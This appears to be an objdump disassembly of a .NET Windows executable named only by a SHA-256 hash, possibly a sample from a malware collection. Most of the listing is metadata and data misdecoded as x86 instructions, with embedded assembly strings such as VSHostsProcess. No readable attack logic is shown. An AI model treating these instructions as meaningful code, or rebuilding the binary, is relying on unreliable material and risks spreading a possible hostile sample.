
48a9a72aa60171651952026dbc5cfd00a1c1c203077d3886235ae9bca511a103.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	inc    eax
  402001:	xor    DWORD PTR [eax],eax
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x21b000
  402013:	add    BYTE PTR [esi+ecx*1],ah
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    DWORD PTR [eax],eax
  40201e:	add    BYTE PTR [esi],al
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    ch,bh
  402051:	inc    edi
  402052:	in     al,0xc0
  402054:	mov    al,ds:0xd53bf99a
  402059:	sbb    eax,0xcfd16b7
  40205e:	jae    0x40201e
  402060:	and    edx,DWORD PTR [esi+eiz*8]
  402063:	pop    ds
  402064:	add    cl,dl
  402066:	fcmovne st,st(4)
  402068:	jmp    0x870a:0xc13360e5
  40206f:	mov    WORD PTR ds:0x5384b7ed,cs
  402075:	lahf   
  402076:	sbb    ah,BYTE PTR ds:0xddf2c2fe
  40207c:	idiv   edx
  40207e:	ror    DWORD PTR [edx],1
  402080:	scas   al,BYTE PTR es:[edi]
  402081:	adc    DWORD PTR [ecx-0x75],ebx
  402084:	sbb    dl,BYTE PTR [edx]
  402086:	(bad)  
  402087:	fild   DWORD PTR [edi+0x77f74132]
  40208d:	test   eax,0x753e51e3
  402092:	test   eax,0xa83c7e4
  402097:	inc    esi
  402098:	sahf   
  402099:	popa   
  40209a:	imul   edi,DWORD PTR [esi+0x2264c29d],0x9d6b6021
  4020a4:	xor    eax,0x17381d01
  4020a9:	lods   al,BYTE PTR ds:[esi]
  4020aa:	dec    edx
  4020ab:	xchg   esp,eax
  4020ac:	xor    esp,edx
  4020ae:	jb     0x402067
  4020b0:	fadd   DWORD PTR ds:0x3248c2bc
  4020b6:	xor    al,0x33
  4020b8:	stc    
  4020b9:	ja     0x402120
  4020bb:	ror    BYTE PTR [eax-0x1c5b16d1],0x8b
  4020c2:	dec    ebx
  4020c3:	sti    
  4020c4:	mov    esp,0x613310dc
  4020c9:	jnp    0x402079
  4020cb:	mov    eax,0xed7c4479
  4020d0:	mov    bl,0x56
  4020d2:	mov    ebp,0xfa6da810
  4020d7:	jns    0x40206e
  4020d9:	dec    edi
  4020da:	push   ebp
  4020db:	(bad)  
  4020dc:	jbe    0x40209c
  4020de:	retf   0x61af
  4020e1:	or     al,0x12
  4020e3:	mov    dh,0x24
  4020e5:	or     eax,0x6eaa2079
  4020ea:	sub    BYTE PTR [esi-0xe77560e],cl
  4020f0:	add    DWORD PTR [edi+ecx*2],eax
  4020f3:	test   al,0x85
  4020f5:	and    bh,dl
  4020f7:	loopne 0x40210f
  4020f9:	push   ebx
  4020fa:	mov    esi,0xfa1f53ee
  4020ff:	std    
  402100:	pusha  
  402101:	ror    esi,0x89
  402104:	ja     0x402090
  402106:	retf   0x7aec
  402109:	mov    ah,0xa9
  40210b:	les    edi,FWORD PTR [esi+eax*8-0x2e]
  40210f:	mov    WORD PTR [ebx],ss
  402111:	sahf   
  402112:	leave  
  402113:	nop
  402114:	in     eax,0x13
  402116:	jle    0x4020c6
  402118:	mov    ds:0xa6f7fbae,eax
  40211d:	dec    esi
  40211e:	adc    ah,BYTE PTR [ecx-0x4e]
  402121:	fisub  DWORD PTR [ecx]
  402123:	jge    0x40213d
  402125:	mov    dl,0xc3
  402127:	mov    esi,0xcbf222ab
  40212c:	cmp    al,0xf8
  40212e:	jo     0x402138
  402130:	add    al,0xea
  402132:	push   ecx
  402133:	mov    WORD PTR [ebp+ebp*1+0x6b],es
  402137:	jo     0x402104
  402139:	jne    0x4020f0
  40213b:	adc    al,0x49
  40213d:	sbb    ah,BYTE PTR [eax+0x4]
  402140:	jno    0x4020d0
  402142:	xchg   esi,eax
  402143:	inc    esp
  402144:	add    eax,0x7bb81d42
  402149:	or     eax,0xdf613cb8
  40214e:	stc    
  40214f:	jb     0x402164
  402151:	xor    BYTE PTR [ebx],al
  402153:	add    BYTE PTR [ecx+0x0],cl
  402156:	add    BYTE PTR [eax],al
  402158:	add    DWORD PTR [eax],eax
  40215a:	add    BYTE PTR [ecx],dl
  40215c:	add    cl,BYTE PTR [esi+0xb2f1769]
  402162:	jb     0x402165
  402164:	add    BYTE PTR [eax],al
  402166:	jo     0x4021db
  402168:	adc    eax,0x7a0a0000
  40216d:	jb     0x4021aa
  40216f:	add    BYTE PTR [eax],al
  402171:	jo     0x402175
  402173:	push   ss
  402174:	call   0xa0a:0x1628
  40217b:	push   es
  40217c:	sub    BYTE PTR [edi],dl
  40217e:	add    BYTE PTR [eax],al
  402180:	or     dl,al
  402182:	sbb    DWORD PTR [eax],eax
  402184:	add    BYTE PTR [ecx],al
  402186:	sub    BYTE PTR [eax],bl
  402188:	add    BYTE PTR [eax],al
  40218a:	or     dh,BYTE PTR [edx+0x7b]
  40218d:	add    BYTE PTR [eax],al
  40218f:	jo     0x4021a8
  402191:	sub    BYTE PTR [ecx],bl
  402193:	add    BYTE PTR [eax],al
  402195:	or     dl,BYTE PTR [esi]
  402197:	jae    0x4021b3
  402199:	add    BYTE PTR [eax],al
  40219b:	or     cl,BYTE PTR [ebx]
  40219d:	pop    es
  40219e:	outs   dx,DWORD PTR ds:[esi]
  40219f:	sbb    eax,DWORD PTR [eax]
  4021a1:	add    BYTE PTR [edx],cl
  4021a3:	sub    bl,BYTE PTR es:[esi]
  4021a6:	add    ch,BYTE PTR [eax]
  4021a8:	sbb    al,0x0
  4021aa:	add    BYTE PTR [edx],cl
  4021ac:	sub    al,BYTE PTR [eax]
  4021ae:	add    BYTE PTR [eax],al
  4021b0:	inc    edx
  4021b1:	push   ebx
  4021b2:	dec    edx
  4021b3:	inc    edx
  4021b4:	add    DWORD PTR [eax],eax
  4021b6:	add    DWORD PTR [eax],eax
  4021b8:	add    BYTE PTR [eax],al
  4021ba:	add    BYTE PTR [eax],al
  4021bc:	or     al,0x0
  4021be:	add    BYTE PTR [eax],al
  4021c0:	jbe    0x4021f6
  4021c2:	xor    BYTE PTR cs:[esi],ch
  4021c5:	xor    esi,DWORD PTR [eax]
  4021c7:	xor    esi,DWORD PTR [ecx]
  4021c9:	cmp    DWORD PTR [eax],eax
  4021cb:	add    BYTE PTR [eax],al
  4021cd:	add    BYTE PTR ds:0x6c00,al
  4021d3:	add    BYTE PTR [eax+0x23000002],ah
  4021d9:	jle    0x4021db
  4021db:	add    BYTE PTR [ebx+eax*1],cl
  4021de:	add    BYTE PTR [eax],al
  4021e0:	mov    ah,0x4
  4021e2:	add    BYTE PTR [eax],al
  4021e4:	and    edx,DWORD PTR [ebx+0x74]
  4021e7:	jb     0x402252
  4021e9:	outs   dx,BYTE PTR ds:[esi]
  4021ea:	addr16 jae 0x4021ed
  4021ed:	add    BYTE PTR [eax],al
  4021ef:	add    al,al
  4021f1:	pop    es
  4021f2:	add    BYTE PTR [eax],al
  4021f4:	mov    al,0x0
  4021f6:	add    BYTE PTR [eax],al
  4021f8:	and    edx,DWORD PTR [ebp+0x53]
  4021fb:	add    BYTE PTR [eax+0x8],dh
  4021fe:	add    BYTE PTR [eax],al
  402200:	adc    BYTE PTR [eax],al
  402202:	add    BYTE PTR [eax],al
  402204:	and    eax,DWORD PTR [edi+0x55]
  402207:	dec    ecx
  402208:	inc    esp
  402209:	add    BYTE PTR [eax],al
  40220b:	add    BYTE PTR [eax-0x5bfffff8],al
  402211:	add    eax,0x42230000
  402216:	ins    BYTE PTR es:[edi],dx
  402217:	outs   dx,DWORD PTR ds:[esi]
  402218:	bound  eax,QWORD PTR [eax]
  40221a:	add    BYTE PTR [eax],al
  40221c:	add    BYTE PTR [eax],al
  40221e:	add    BYTE PTR [eax],al
  402220:	add    al,BYTE PTR [eax]
  402222:	add    BYTE PTR [ecx],al
  402224:	inc    edi
  402225:	adc    eax,0x90002
  40222a:	add    BYTE PTR [eax],al
  40222c:	add    dl,bh
  40222e:	and    eax,0x160033
  402233:	add    BYTE PTR [ecx],al
  402235:	add    BYTE PTR [eax],al
  402237:	add    BYTE PTR [edi],bl
  402239:	add    BYTE PTR [eax],al
  40223b:	add    BYTE PTR [edx],al
  40223d:	add    BYTE PTR [eax],al
  40223f:	add    BYTE PTR [edx],al
  402241:	add    BYTE PTR [eax],al
  402243:	add    BYTE PTR [ecx],al
  402245:	add    BYTE PTR [eax],al
  402247:	add    BYTE PTR [eax+eax*1],bl
  40224a:	add    BYTE PTR [eax],al
  40224c:	adc    eax,DWORD PTR [eax]
  40224e:	add    BYTE PTR [eax],al
  402250:	add    DWORD PTR [eax],eax
  402252:	add    BYTE PTR [eax],al
  402254:	add    DWORD PTR [eax],eax
  402256:	add    BYTE PTR [eax],al
  402258:	add    al,BYTE PTR [eax]
  40225a:	add    BYTE PTR [eax],al
  40225c:	add    BYTE PTR [eax],al
  40225e:	or     al,BYTE PTR [eax]
  402260:	add    DWORD PTR [eax],eax
  402262:	add    BYTE PTR [eax],al
  402264:	add    BYTE PTR [eax],al
  402266:	push   es
  402267:	add    BYTE PTR [edx+0x0],ah
  40226a:	pop    ebx
  40226b:	add    BYTE PTR [esi],al
  40226d:	add    BYTE PTR [ebx+0x6007900],dl
  402273:	add    bl,cl
  402275:	add    BYTE PTR [eax+eax*1+0xdf0006],ch
  40227c:	pop    ebx
  40227d:	add    BYTE PTR [esi],al
  40227f:	add    BYTE PTR [edi],al
  402281:	add    ebp,esi
  402283:	add    BYTE PTR [esi],al
  402285:	add    BYTE PTR [esi],bl
  402287:	add    ebp,esi
  402289:	add    BYTE PTR [esi],al
  40228b:	add    BYTE PTR [ebx],bh
  40228d:	add    ebp,esi
  40228f:	add    BYTE PTR [esi],al
  402291:	add    BYTE PTR [ecx+0x1],bl
  402294:	cmc    
  402295:	add    BYTE PTR [esi],al
  402297:	add    BYTE PTR [edx+0x1],dh
  40229a:	cmc    
  40229b:	add    BYTE PTR [esi],al
  40229d:	add    BYTE PTR [ebx+0x600f501],cl
  4022a3:	add    BYTE PTR [esi+0x600f501],ah
  4022a9:	add    BYTE PTR [edi+0x600f501],bh
  4022af:	add    ah,bl
  4022b1:	add    ebp,esi
  4022b3:	add    BYTE PTR [esi],al
  4022b5:	add    BYTE PTR [ebx],dl
  4022b7:	add    al,BYTE PTR [edx]
  4022b9:	add    al,BYTE PTR [esi]
  4022bb:	add    BYTE PTR ds:0x6020202,dh
  4022c1:	add    BYTE PTR [edi+0x2],dl
  4022c4:	cmc    
  4022c5:	add    BYTE PTR [esi],al
  4022c7:	add    BYTE PTR [edx+0x2],dh
  4022ca:	cmc    
  4022cb:	add    BYTE PTR [esi],al
  4022cd:	add    BYTE PTR [ebx+0x600f502],cl
  4022d3:	add    cl,cl
  4022d5:	add    ch,BYTE PTR [ecx-0x5fff9fe]
  4022db:	add    ah,bh
  4022dd:	add    dl,BYTE PTR [ebx+0x0]
  4022e0:	push   cs
  4022e1:	add    eax,DWORD PTR [eax]
  4022e3:	add    BYTE PTR [esi],al
  4022e5:	add    BYTE PTR ds:0x602a903,bl
  4022eb:	add    BYTE PTR [ebp+0x3],cl
  4022ee:	pop    ebx
  4022ef:	add    BYTE PTR [esi],al
  4022f1:	add    BYTE PTR [edi+0x3],bl
  4022f4:	pop    ebx
  4022f5:	add    BYTE PTR [edx],cl
  4022f7:	add    ah,cl
  4022f9:	add    ebx,DWORD PTR [edi-0x7fff9fd]
  4022ff:	add    ebx,DWORD PTR [ebx+0x0]
  402302:	push   es
  402303:	add    ch,bh
  402305:	add    ebx,DWORD PTR [ebx+0x0]
  402308:	push   es
  402309:	add    BYTE PTR [ecx],bh
  40230b:	add    al,0x21
  40230d:	add    al,0x6
  40230f:	add    BYTE PTR [edi+0x4],cl
  402312:	and    DWORD PTR [esi+eax*1],eax
  402315:	add    BYTE PTR [ecx+0x6048004],dl
  40231b:	add    BYTE PTR [eax+0x48004],ah
  402321:	add    BYTE PTR [eax],al
  402323:	add    BYTE PTR [ecx],al
  402325:	add    BYTE PTR [eax],al
  402327:	add    BYTE PTR [eax],al
  402329:	add    BYTE PTR [ecx],al
  40232b:	add    BYTE PTR [ecx],al
  40232d:	add    BYTE PTR [ecx],al
  40232f:	add    BYTE PTR [eax],dl
  402331:	add    BYTE PTR [esi],bl
  402333:	add    BYTE PTR [eax+eax*1],ch
  402336:	add    eax,0x1000100
  40233b:	add    BYTE PTR [eax+0x21],dl
  40233e:	add    BYTE PTR [eax],al
  402340:	add    BYTE PTR [eax],al
  402342:	xchg   ecx,eax
  402343:	add    BYTE PTR [ecx+0x0],ch
  402346:	or     al,BYTE PTR [eax]
  402348:	add    DWORD PTR [eax],eax
  40234a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40234b:	and    DWORD PTR [eax],eax
  40234d:	add    BYTE PTR [eax],al
  40234f:	add    BYTE PTR [esi+0x10006e18],al
  402355:	add    BYTE PTR [edx],al
  402357:	add    BYTE PTR [eax],al
  402359:	add    BYTE PTR [ecx],al
  40235b:	add    BYTE PTR [eax+eax*1+0x11],dh
  40235f:	add    BYTE PTR [esi+0x0],ch
  402362:	adc    al,0x0
  402364:	sbb    DWORD PTR [eax],eax
  402366:	outs   dx,BYTE PTR ds:[esi]
  402367:	add    BYTE PTR [ecx],bl
  402369:	add    BYTE PTR [ecx],ah
  40236b:	add    BYTE PTR [esi+0x0],ch
  40236e:	sbb    DWORD PTR [eax],eax
  402370:	sub    DWORD PTR [eax],eax
  402372:	outs   dx,BYTE PTR ds:[esi]
  402373:	add    BYTE PTR [eax+eax*1],dl
  402376:	xor    DWORD PTR [eax],eax
  402378:	outs   dx,BYTE PTR ds:[esi]
  402379:	add    BYTE PTR [eax+eax*1],dl
  40237c:	cmp    DWORD PTR [eax],eax
  40237e:	outs   dx,BYTE PTR ds:[esi]
  40237f:	add    BYTE PTR [eax+eax*1],dl
  402382:	inc    ecx
  402383:	add    BYTE PTR [esi+0x0],ch
  402386:	adc    al,0x0
  402388:	dec    ecx
  402389:	add    BYTE PTR [esi+0x0],ch
  40238c:	adc    al,0x0
  40238e:	push   ecx
  40238f:	add    BYTE PTR [esi+0x0],ch
  402392:	adc    al,0x0
  402394:	pop    ecx
  402395:	add    BYTE PTR [esi+0x0],ch
  402398:	adc    al,0x0
  40239a:	popa   
  40239b:	add    BYTE PTR [esi+0x0],ch
  40239e:	adc    al,0x0
  4023a0:	imul   eax,DWORD PTR [eax],0x14006e
  4023a6:	jno    0x4023a8
  4023a8:	outs   dx,BYTE PTR ds:[esi]
  4023a9:	add    BYTE PTR [eax+eax*1],dl
  4023ac:	jns    0x4023ae
  4023ae:	outs   dx,BYTE PTR ds:[esi]
  4023af:	add    BYTE PTR [eax+eax*1],dl
  4023b2:	add    DWORD PTR [eax],0x19006e
  4023b8:	mov    DWORD PTR [eax],eax
  4023ba:	outs   dx,BYTE PTR ds:[esi]
  4023bb:	add    BYTE PTR [eax+eax*1],dl
  4023be:	xchg   ecx,eax
  4023bf:	add    BYTE PTR [esi+0x0],ch
  4023c2:	push   ds
  4023c3:	add    BYTE PTR [ecx+0x10006e00],bl
  4023c9:	add    BYTE PTR [ecx+0x24006e00],ah
  4023cf:	add    BYTE PTR [ecx+0x2a006e00],dh
  4023d5:	add    BYTE PTR [ecx+0x14006e00],bh
  4023db:	add    cl,al
  4023dd:	add    BYTE PTR [esi+0x3],ah
  4023e0:	rol    DWORD PTR [eax],1
  4023e2:	leave  
  4023e3:	add    ch,ah
  4023e5:	add    esp,eax
  4023e7:	add    cl,dl
  4023e9:	add    BYTE PTR [edi],cl
  4023eb:	add    al,0xe5
  4023ed:	add    cl,ah
  4023ef:	add    BYTE PTR [ebx+0x4],ah
  4023f2:	in     al,dx
  4023f3:	add    cl,dh
  4023f5:	add    BYTE PTR [esi+0x0],ch
  4023f8:	sbb    DWORD PTR [eax],eax
  4023fa:	stc    
  4023fb:	add    BYTE PTR [ebx+0x900f504],ch
  402401:	add    BYTE PTR [esi+0x0],ch
  402404:	adc    BYTE PTR [eax],al
  402406:	add    BYTE PTR cs:[ebx],cl
  402409:	add    bh,bh
  40240b:	add    BYTE PTR [esi],ch
  40240d:	add    BYTE PTR [ebx],dl
  40240f:	add    BYTE PTR [edi],dh
  402411:	add    DWORD PTR [esi],ebp
  402413:	add    BYTE PTR [ebx],bl
  402415:	add    BYTE PTR [edi],dh
  402417:	add    DWORD PTR [esi],ebp
  402419:	add    BYTE PTR [ebx],ah
  40241b:	add    BYTE PTR ds:0x2b002e01,bh
  402421:	add    BYTE PTR ds:0x33002e01,bh
  402427:	add    BYTE PTR ds:0x3b002e01,bh
  40242d:	add    BYTE PTR [esi+0x1],dl
  402430:	add    BYTE PTR cs:[ebx+0x0],al
  402434:	jno    0x402437
  402436:	add    BYTE PTR cs:[ebx+0x0],cl
  40243a:	xchg   edi,eax
  40243b:	add    DWORD PTR [esi],ebp
  40243d:	add    BYTE PTR [ebx+0x0],bl
  402440:	retf   
  402441:	add    DWORD PTR [esi],ebp
  402443:	add    BYTE PTR [ebx+0x0],ah
  402446:	retf   
  402447:	add    DWORD PTR [esi],ebp
  402449:	add    BYTE PTR [ebx+0x0],ch
  40244c:	fld    QWORD PTR [ecx]
  40244e:	add    BYTE PTR cs:[ebx+0x0],dh
  402452:	jmp    0x402455
  402454:	add    BYTE PTR cs:[ebx+0x0],bh
  402458:	test   BYTE PTR [ecx],0x2e
  40245b:	add    BYTE PTR [ebx+0x2e01fc00],al
  402461:	add    BYTE PTR [ebx+0x2e022700],cl
  402467:	add    BYTE PTR [ebx+0x2e057100],dl
  40246d:	add    BYTE PTR [ebx+0x2e059000],bl
  402473:	add    BYTE PTR [ebx-0x6fa6700],ah
  402479:	add    BYTE PTR [eax+eax*4],al
  40247c:	add    BYTE PTR [eax],al
  40247e:	or     eax,DWORD PTR [eax]
  402480:	add    BYTE PTR [eax],al
  402482:	add    BYTE PTR [eax],al
  402484:	add    BYTE PTR [eax],al
  402486:	add    DWORD PTR [eax],eax
  402488:	add    BYTE PTR [eax],al
  40248a:	das    
  40248b:	add    BYTE PTR ds:0x4000003,bh
	...
  402499:	add    BYTE PTR [eax],al
  40249b:	add    BYTE PTR [ecx],al
  40249d:	add    BYTE PTR [edx+0x0],dl
  4024a0:	add    BYTE PTR [eax],al
  4024a2:	add    BYTE PTR [eax],al
  4024a4:	or     eax,DWORD PTR [eax]
	...
  4024ae:	add    BYTE PTR [eax],al
  4024b0:	xlat   BYTE PTR ds:[ebx]
  4024b1:	add    BYTE PTR [ebp+0x3],ch
	...
  4024bc:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  4024c3:	gs add BYTE PTR ds:[esp+esi*1+0x56],dl
  4024c9:	push   ebx
  4024ca:	dec    eax
  4024cb:	outs   dx,DWORD PTR ds:[esi]
  4024cc:	jae    0x402542
  4024ce:	push   eax
  4024cf:	jb     0x402540
  4024d1:	arpl   WORD PTR [ebp+0x73],sp
  4024d4:	jae    0x402504
  4024d6:	gs js  0x40253e
  4024d9:	add    BYTE PTR [esi+0x53],dl
  4024dc:	dec    eax
  4024dd:	outs   dx,DWORD PTR ds:[esi]
  4024de:	jae    0x402554
  4024e0:	push   eax
  4024e1:	jb     0x402552
  4024e3:	arpl   WORD PTR [ebp+0x73],sp
  4024e6:	jae    0x4024e8
  4024e8:	dec    ebp
  4024e9:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4024f0:	je     0x402520
  4024f2:	push   esi
  4024f3:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4024fa:	jne    0x402560
  4024fc:	imul   ebp,DWORD PTR [edi+0x2e],0x74786554
  402503:	push   esp
  402504:	gs ins DWORD PTR es:[edi],dx
  402506:	jo     0x402574
  402508:	popa   
  402509:	je     0x402574
  40250b:	outs   dx,BYTE PTR ds:[esi]
  40250c:	add    BYTE PTR [di+0x73],ch
  402510:	arpl   WORD PTR [edi+0x72],bp
  402513:	ins    BYTE PTR es:[edi],dx
  402514:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  40251b:	gs ins DWORD PTR es:[edi],dx
  40251d:	add    BYTE PTR [edi+0x62],cl
  402520:	push   0x65
  402522:	arpl   WORD PTR [eax+eax*1+0x4d],si
  402526:	popa   
  402527:	imul   ebp,DWORD PTR [esi+0x0],0x6f74632e
  40252e:	jb     0x402530
  402530:	popa   
  402531:	jb     0x40259a
  402533:	jae    0x402535
  402535:	push   ebx
  402536:	jns    0x4025ab
  402538:	je     0x40259f
  40253a:	ins    DWORD PTR es:[edi],dx
  40253b:	cs push edx
  40253d:	jne    0x4025ad
  40253f:	je     0x4025aa
  402541:	ins    DWORD PTR es:[edi],dx
  402542:	gs cs push esi
  402545:	gs jb  0x4025bb
  402548:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  40254f:	push   esp
  402550:	popa   
  402551:	jb     0x4025ba
  402553:	gs je  0x40259c
  402556:	jb     0x4025b9
  402558:	ins    DWORD PTR es:[edi],dx
  402559:	gs ja  0x4025cb
  40255c:	jb     0x4025c9
  40255e:	inc    ecx
  40255f:	je     0x4025d5
  402561:	jb     0x4025cc
  402563:	bound  esi,QWORD PTR [ebp+0x74]
  402566:	add    BYTE PTR gs:[ebx+0x79],dl
  40256a:	jae    0x4025e0
  40256c:	gs ins DWORD PTR es:[edi],dx
  40256e:	cs push edx
  402570:	jne    0x4025e0
  402572:	je     0x4025dd
  402574:	ins    DWORD PTR es:[edi],dx
  402575:	gs cs dec ecx
  402578:	outs   dx,BYTE PTR ds:[esi]
  402579:	je     0x4025e0
  40257b:	jb     0x4025ec
  40257d:	jo     0x4025d2
  40257f:	gs jb  0x4025f8
  402582:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  402589:	ins    DWORD PTR es:[edi],dx
  40258a:	push   esi
  40258b:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  402592:	je     0x402608
  402594:	jb     0x4025ff
  402596:	bound  esi,QWORD PTR [ebp+0x74]
  402599:	add    BYTE PTR gs:[ebx+0x4c],al
  40259d:	push   ebx
  40259e:	inc    ebx
  40259f:	outs   dx,DWORD PTR ds:[esi]
  4025a0:	ins    DWORD PTR es:[edi],dx
  4025a1:	jo     0x40260f
  4025a3:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4025aa:	jb     0x402615
  4025ac:	bound  esi,QWORD PTR [ebp+0x74]
  4025af:	add    BYTE PTR gs:[ebx+0x79],dl
  4025b3:	jae    0x402629
  4025b5:	gs ins DWORD PTR es:[edi],dx
  4025b7:	cs push edx
  4025b9:	gs data16 ins BYTE PTR es:[edi],dx
  4025bc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4025c1:	outs   dx,BYTE PTR ds:[esi]
  4025c2:	add    BYTE PTR [ecx+0x73],al
  4025c5:	jae    0x40262c
  4025c7:	ins    DWORD PTR es:[edi],dx
  4025c8:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4025cc:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4025d4:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4025db:	jae    0x402650
  4025dd:	gs ins DWORD PTR es:[edi],dx
  4025df:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4025e3:	gs jae 0x402649
  4025e6:	jb     0x402651
  4025e8:	jo     0x40265e
  4025ea:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4025f1:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4025f8:	jae    0x40266d
  4025fa:	gs ins DWORD PTR es:[edi],dx
  4025fc:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402600:	gs popaw 
  402603:	jne    0x402671
  402605:	je     0x402648
  402607:	ins    BYTE PTR es:[edi],dx
  402608:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40260f:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402616:	jae    0x40268b
  402618:	gs ins DWORD PTR es:[edi],dx
  40261a:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40261e:	outs   dx,DWORD PTR ds:[esi]
  40261f:	ins    DWORD PTR es:[edi],dx
  402620:	jo     0x402683
  402622:	outs   dx,BYTE PTR ds:[esi]
  402623:	jns    0x402666
  402625:	je     0x40269b
  402627:	jb     0x402692
  402629:	bound  esi,QWORD PTR [ebp+0x74]
  40262c:	add    BYTE PTR gs:[ecx+0x73],al
  402630:	jae    0x402697
  402632:	ins    DWORD PTR es:[edi],dx
  402633:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402637:	jb     0x4026a8
  402639:	fs jne 0x40269f
  40263c:	je     0x40267f
  40263e:	je     0x4026b4
  402640:	jb     0x4026ab
  402642:	bound  esi,QWORD PTR [ebp+0x74]
  402645:	add    BYTE PTR gs:[ecx+0x73],al
  402649:	jae    0x4026b0
  40264b:	ins    DWORD PTR es:[edi],dx
  40264c:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402650:	outs   dx,DWORD PTR ds:[esi]
  402651:	jo     0x4026cc
  402653:	jb     0x4026be
  402655:	addr16 push 0x74744174
  40265b:	jb     0x4026c6
  40265d:	bound  esi,QWORD PTR [ebp+0x74]
  402660:	add    BYTE PTR gs:[ecx+0x73],al
  402664:	jae    0x4026cb
  402666:	ins    DWORD PTR es:[edi],dx
  402667:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40266b:	gs jb  0x4026e1
  40266e:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402675:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40267c:	jae    0x4026f1
  40267e:	gs ins DWORD PTR es:[edi],dx
  402680:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402684:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  40268c:	outs   dx,DWORD PTR ds:[esi]
  40268d:	outs   dx,BYTE PTR ds:[esi]
  40268e:	inc    ecx
  40268f:	je     0x402705
  402691:	jb     0x4026fc
  402693:	bound  esi,QWORD PTR [ebp+0x74]
  402696:	add    BYTE PTR gs:[ecx+0x73],al
  40269a:	jae    0x402701
  40269c:	ins    DWORD PTR es:[edi],dx
  40269d:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4026a1:	outs   dx,BYTE PTR ds:[esi]
  4026a2:	outs   dx,WORD PTR ds:[esi]
  4026a4:	jb     0x402713
  4026a6:	popa   
  4026a7:	je     0x402712
  4026a9:	outs   dx,DWORD PTR ds:[esi]
  4026aa:	outs   dx,BYTE PTR ds:[esi]
  4026ab:	popa   
  4026ac:	ins    BYTE PTR es:[edi],dx
  4026ad:	push   esi
  4026ae:	gs jb  0x402724
  4026b1:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4026b8:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  4026bf:	jns    0x402734
  4026c1:	je     0x402728
  4026c3:	ins    DWORD PTR es:[edi],dx
  4026c4:	cs push edx
  4026c6:	gs jae 0x402738
  4026c9:	jne    0x40273d
  4026cb:	arpl   WORD PTR [ebp+0x73],sp
  4026ce:	add    BYTE PTR [ebx+0x61],dl
  4026d1:	je     0x402738
  4026d3:	ins    BYTE PTR es:[edi],dx
  4026d4:	ins    BYTE PTR es:[edi],dx
  4026d5:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  4026dd:	popa   
  4026de:	arpl   WORD PTR [esi+edx*2+0x65],si
  4026e2:	jb     0x402757
  4026e4:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4026eb:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  4026f2:	gs jne 0x402769
  4026f5:	jb     0x402758
  4026f7:	ins    BYTE PTR es:[edi],dx
  4026f8:	push   edx
  4026f9:	gs jae 0x40276b
  4026fc:	jne    0x402770
  4026fe:	arpl   WORD PTR [ebp+0x73],sp
  402701:	dec    esp
  402702:	popa   
  402703:	outs   dx,BYTE PTR ds:[esi]
  402704:	addr16 jne 0x402768
  402707:	addr16 gs inc ecx
  40270a:	je     0x402780
  40270c:	jb     0x402777
  40270e:	bound  esi,QWORD PTR [ebp+0x74]
  402711:	add    BYTE PTR gs:[ecx+0x73],al
  402715:	jae    0x40277c
  402717:	ins    DWORD PTR es:[edi],dx
  402718:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40271c:	gs ins BYTE PTR es:[edi],dx
  40271e:	popa   
  40271f:	jns    0x402774
  402721:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  402728:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40272f:	jae    0x4027a4
  402731:	gs ins DWORD PTR es:[edi],dx
  402733:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  402737:	gs jns 0x402780
  40273a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  402742:	bound  esi,QWORD PTR [ebp+0x74]
  402745:	add    BYTE PTR gs:[ecx+0x73],al
  402749:	jae    0x4027b0
  40274b:	ins    DWORD PTR es:[edi],dx
  40274c:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  402750:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  402757:	gs dec ebx
  402759:	gs jns 0x40279d
  40275c:	je     0x4027d2
  40275e:	jb     0x4027c9
  402760:	bound  esi,QWORD PTR [ebp+0x74]
  402763:	add    BYTE PTR gs:[ebx+0x79],dl
  402767:	jae    0x4027dd
